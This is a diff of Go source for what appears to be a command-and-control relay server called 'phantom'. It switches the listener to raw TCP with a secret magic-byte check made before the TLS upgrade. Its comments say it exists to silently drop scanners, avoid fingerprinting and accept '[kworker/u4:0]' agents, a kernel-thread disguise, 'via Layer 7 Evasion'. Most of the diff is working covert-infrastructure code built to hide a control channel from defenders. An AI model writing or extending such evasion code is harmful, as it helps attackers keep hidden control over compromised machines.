@@ -37,6 +37,7 @@ var (
 	peerMutex    sync.Mutex
 	consoleMode  bool
 	promptLock   sync.Mutex
+	relayTLSConfig *tls.Config
 )
 
 type crlfWriter struct {
@@ -47,6 +48,12 @@ func (w *crlfWriter) Write(p []byte) (n int, err error) {
 	promptLock.Lock()
 	defer promptLock.Unlock()
 
+	// 1. Clear current line (the prompt) to prevent log bleeding into input
+	if consoleMode {
+		fmt.Print("\r\033[K")
+	}
+
+	// 2. Format and write the log message with CRLF for compatibility
 	buf := make([]byte, 0, len(p)*2)
 	for i := 0; i < len(p); i++ {
 		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
@@ -58,7 +65,7 @@ func (w *crlfWriter) Write(p []byte) (n int, err error) {
 
 	n, err = w.writer.Write(buf)
 
-	// Asynchronous Prompt Redraw
+	// 3. Asynchronous Prompt Redraw
 	if consoleMode {
 		prompt := "phantom> "
 		peerMutex.Lock()
@@ -202,21 +209,17 @@ func main() {
 	if err != nil {
 		logger.Fatalf("Failed to create TLS config: %v", err)
 	}
+	relayTLSConfig = tlsConfig
 
-	// MISSION: Universal TLS Termination without warnings
-	var listener net.Listener
-	if os.Getenv("PH_ENABLE_RAW_TCP") == "true" {
-		listener, err = net.Listen("tcp", cfg.ListenAddr)
-		logger.Printf("Relay server listening on %s (Raw TCP FALLBACK ENABLED)", cfg.ListenAddr)
-	} else {
-		listener, err = tls.Listen("tcp", cfg.ListenAddr, tlsConfig)
-		logger.Printf("Relay server listening on %s", cfg.ListenAddr)
-	}
-
+	// MISSION: Universal TLS Termination without warnings. 
+	// We use raw net.Listen to allow PSK validation BEFORE TLS handshake.
+	listener, err := net.Listen("tcp", cfg.ListenAddr)
 	if err != nil {
 		logger.Fatalf("Failed to start listener: %v", err)
 	}
 	defer listener.Close()
+
+	logger.Printf("Relay server listening on %s (Hybrid PSK+TLS mode)", cfg.ListenAddr)
 
 	logger.Println("Ready to accept [kworker/u4:0] agents via Layer 7 Evasion")
 
@@ -260,6 +263,9 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		}
 	}()
 
+	remoteAddr := conn.RemoteAddr().String()
+	// No logs before PSK validation to drop scanners silently
+
 	// Pre-Auth Pre-Logging Guard: The multiplexer MUST read the incoming raw socket connection asynchronously.
 	// If the initial 4 bytes do NOT exactly match Big-Endian 0x4F59454E ("OYEN"),
 	// the relay MUST immediately terminate the socket interface (conn.Close()) WITHOUT printing any notification.
@@ -276,19 +282,19 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		return
 	}
 
-	remoteAddr := conn.RemoteAddr().String()
-	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
-
-	// Explicit TLS Handshake for early error detection
-	if tlsConn, ok := conn.(*tls.Conn); ok {
-		tlsConn.SetDeadline(time.Now().Add(5 * time.Second))
-		if err := tlsConn.Handshake(); err != nil {
-			logger.Printf("TLS handshake failed from %s: %v", remoteAddr, err)
-			conn.Close()
-			return
-		}
-		logger.Printf("TLS handshake completed from %s", remoteAddr)
+	// Upgrade to TLS after PSK validation
+	tlsConn := tls.Server(conn, relayTLSConfig)
+	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
+	if err := tlsConn.Handshake(); err != nil {
+		// Silent drop even on handshake failure to avoid fingerprinting
+		tlsConn.Close()
+		return
 	}
+	// Replace conn with tlsConn for subsequent operations
+	conn = tlsConn
+
+	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
+	logger.Printf("TLS handshake completed from %s", remoteAddr)
 
 	conn.SetReadDeadline(time.Now().Add(time.Duration(cfg.HandshakeTimeout) * time.Second))
 
